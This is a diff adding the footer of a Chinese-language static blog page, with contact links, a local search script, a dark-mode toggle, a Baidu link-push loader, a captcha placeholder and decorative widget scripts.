+    </a>
+
+
+
+    <a href="mailto:1228876399@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1228876399" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1228876399" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
